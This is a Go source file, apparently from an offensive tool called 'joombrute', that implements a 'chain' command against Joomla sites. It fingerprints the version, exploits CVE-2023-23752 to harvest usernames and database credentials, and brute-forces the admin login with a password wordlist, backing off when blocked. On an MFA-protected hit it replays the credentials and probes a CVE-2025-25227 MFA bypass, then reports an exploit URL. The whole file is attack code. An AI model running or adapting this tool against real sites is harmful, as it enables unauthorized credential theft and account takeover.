package main

import (
	"context"
	"fmt"
	"os/signal"
	"syscall"
	"time"

	"github.com/rvzsec/joombrute/internal/brute"
	"github.com/rvzsec/joombrute/internal/httpx"
	"github.com/rvzsec/joombrute/internal/joomla"
	"github.com/rvzsec/joombrute/internal/mfa"
	"github.com/rvzsec/joombrute/internal/output"
	"github.com/rvzsec/joombrute/internal/recon"
	"github.com/spf13/cobra"
)

type chainFlags struct {
	wordlist       string
	usernamesFile  string
	extraUsername  string
	concurrency    int
	requestTimeout time.Duration
	backoff        time.Duration
	skipEnum       bool
	skipBypass     bool
}

var chFlags chainFlags

func newChainCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "chain",
		Short: "Full auto: detect -> enum -> brute -> MFA-bypass probe",
		Long: `The "smart" mode: do everything in the right order.

  1. Fingerprint Joomla version.
  2. CVE-2023-23752 - dump usernames + DB creds (if J4.0 - 4.2.7).
  3. Brute the admin form with the harvested usernames + supplied wordlist
     (falls back to --user/--users if step 2 returned nothing).
  4. On any MFA-required hit, probe CVE-2025-25227 MFA bypass.
  5. Print a structured summary.

Use this when you have a target URL and want one command to walk the full
chain. For surgical use, prefer the dedicated subcommands.`,
		RunE: runChain,
	}
	f := cmd.Flags()
	f.StringVarP(&chFlags.wordlist, "wordlist", "w", "", "Password wordlist (required)")
	f.StringVar(&chFlags.usernamesFile, "users", "", "Extra usernames file (merged with API harvest)")
	f.StringVar(&chFlags.extraUsername, "user", "", "Extra single username")
	f.IntVarP(&chFlags.concurrency, "concurrency", "c", 10, "Brute worker count")
	f.DurationVar(&chFlags.requestTimeout, "request-timeout", 15*time.Second, "Per-request timeout")
	f.DurationVar(&chFlags.backoff, "backoff", 5*time.Second, "Sleep after blocked response")
	f.BoolVar(&chFlags.skipEnum, "skip-enum", false, "Skip CVE-2023-23752 username/DB harvest")
	f.BoolVar(&chFlags.skipBypass, "skip-bypass", false, "Skip CVE-2025-25227 bypass probe on MFA hits")
	return cmd
}

func runChain(_ *cobra.Command, _ []string) error {
	if gflags.URL == "" {
		return fmt.Errorf("--url is required")
	}
	if chFlags.wordlist == "" {
		return fmt.Errorf("--wordlist is required")
	}

	sink, closer := buildSink()
	defer closer()

	t, err := joomla.NewTarget(gflags.URL)
	if err != nil {
		return err
	}

	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancel()

	// Step 1 - version detect.
	reconClient, err := httpx.New(httpx.Config{
		Timeout:         10 * time.Second,
		Proxy:           gflags.Proxy,
		UserAgent:       gflags.UserAgent,
		InsecureTLS:     gflags.InsecureTLS,
		FollowRedirects: true,
	})
	if err != nil {
		return err
	}
	info, derr := joomla.Detect(ctx, reconClient, t)
	if derr != nil {
		sink.Warnf("detect: %v", derr)
	}
	if info.Exact != "" {
		sink.Infof("[1/4] detect: %s (%s, source=%s)", info.Exact, info.Major, info.Source)
	} else {
		sink.Infof("[1/4] detect: %s (source=%s)", info.Major, info.Source)
	}

	// Step 2 - enum via CVE-2023-23752.
	usernames := []string{}
	if chFlags.extraUsername != "" {
		usernames = append(usernames, chFlags.extraUsername)
	}
	if chFlags.usernamesFile != "" {
		extra, err := loadUsernames("", chFlags.usernamesFile)
		if err != nil {
			return err
		}
		usernames = append(usernames, extra...)
	}

	if !chFlags.skipEnum {
		res, err := recon.RunCVE2023_23752(ctx, reconClient, t)
		if err == nil && res.HasFindings() {
			harvested := res.Usernames()
			if len(harvested) > 0 {
				sink.Infof("[2/4] enum: harvested %d usernames from API", len(harvested))
				usernames = append(usernames, harvested...)
				sink.Hit(output.Hit{
					Target:  t.String(),
					Outcome: "info-disclosure",
					Note:    fmt.Sprintf("CVE-2023-23752: %d usernames", len(harvested)),
				})
			}
			if res.DBConfig != nil && res.DBConfig.DBPass != "" {
				sink.Hit(output.Hit{
					Target:  t.String(),
					Outcome: "info-disclosure",
					Note: fmt.Sprintf("CVE-2023-23752: DB creds %s@%s/%s (password disclosed)",
						res.DBConfig.DBUser, res.DBConfig.DBHost, res.DBConfig.DBName),
				})
			}
		} else {
			sink.Infof("[2/4] enum: CVE-2023-23752 returned nothing (target patched or filtered)")
		}
	} else {
		sink.Infof("[2/4] enum: skipped")
	}

	usernames = dedupeStrings(usernames)
	if len(usernames) == 0 {
		return fmt.Errorf("no usernames available - supply --user or --users, or unblock CVE-2023-23752 enum")
	}

	// Step 3 - brute.
	sink.Infof("[3/4] brute: %d usernames x wordlist=%s c=%d",
		len(usernames), chFlags.wordlist, chFlags.concurrency)
	stats, err := brute.Run(ctx, brute.Config{
		Target:         t,
		Usernames:      usernames,
		PasswordFile:   chFlags.wordlist,
		Concurrency:    chFlags.concurrency,
		Proxy:          gflags.Proxy,
		UserAgent:      gflags.UserAgent,
		InsecureTLS:    gflags.InsecureTLS,
		RequestTimeout: chFlags.requestTimeout,
		StopOnSuccess:  true,
		StopOnMFA:      true, // we want to pivot to bypass probe
		BackoffBlocked: chFlags.backoff,
		Sink:           sink,
	})
	if err != nil {
		return err
	}
	sink.Infof("[3/4] brute done: attempted=%d valid=%d mfa=%d blocked=%d errors=%d elapsed=%s",
		stats.Attempted, stats.Valid, stats.MFAGuarded, stats.Blocked, stats.Errors, stats.Elapsed)

	// Step 4 - bypass probe. Skip if disabled or no MFA-required hit
	// was captured. The brute loop discarded its session per worker, so
	// we run a fresh password POST to land on the captive page and then
	// probe.
	if chFlags.skipBypass {
		sink.Infof("[4/4] mfa-bypass: skipped (--skip-bypass)")
		return nil
	}
	if stats.MFAGuarded == 0 || stats.FirstHit == nil || stats.FirstHit.Outcome != "mfa-required" {
		sink.Infof("[4/4] mfa-bypass: skipped (no MFA-required outcome captured)")
		return nil
	}

	hit := stats.FirstHit
	sink.Infof("[4/4] mfa-bypass: probing CVE-2025-25227 with %s:%s ...", hit.Username, hit.Password)

	probeClient, err := httpx.New(httpx.Config{
		Timeout:         chFlags.requestTimeout,
		Proxy:           gflags.Proxy,
		UserAgent:       gflags.UserAgent,
		InsecureTLS:     gflags.InsecureTLS,
		FollowRedirects: false,
	})
	if err != nil {
		return fmt.Errorf("probe client init: %w", err)
	}

	// Reproduce the half-authed session: GET form, POST creds, land on
	// captive, then probe.
	form, err := joomla.FetchLoginForm(ctx, probeClient, t)
	if err != nil {
		sink.Warnf("[4/4] mfa-bypass: could not refetch login form: %v", err)
		return nil
	}
	res, err := joomla.Attempt(ctx, probeClient, form, hit.Username, hit.Password)
	if err != nil {
		sink.Warnf("[4/4] mfa-bypass: password POST failed: %v", err)
		return nil
	}
	if res.Outcome != joomla.OutcomeMFARequired {
		sink.Warnf("[4/4] mfa-bypass: re-attempt did not yield captive (outcome=%s) - skipping probe",
			res.Outcome)
		return nil
	}

	captiveURL := res.CaptiveURL
	if captiveURL == "" {
		captiveURL = hit.CaptiveURL
	}

	probe, err := mfa.ProbeCVE2025_25227(ctx, probeClient, t.AdminURL(), captiveURL)
	if err != nil {
		sink.Warnf("[4/4] mfa-bypass: probe error: %v", err)
		return nil
	}
	if probe.Vulnerable {
		sink.Hit(output.Hit{
			Target:   t.String(),
			Username: hit.Username,
			Outcome:  "mfa-bypass",
			Note:     "CVE-2025-25227 captive state-check bypass: " + probe.Evidence,
		})
		sink.Infof("[4/4] mfa-bypass: VULNERABLE - exploit URL %s", probe.ExploitURL)
	} else {
		sink.Infof("[4/4] mfa-bypass: not vulnerable (%s)", probe.Evidence)
	}
	return nil
}

func dedupeStrings(in []string) []string {
	seen := make(map[string]struct{}, len(in))
	out := make([]string, 0, len(in))
	for _, s := range in {
		if _, dup := seen[s]; dup {
			continue
		}
		seen[s] = struct{}{}
		out = append(out, s)
	}
	return out
}
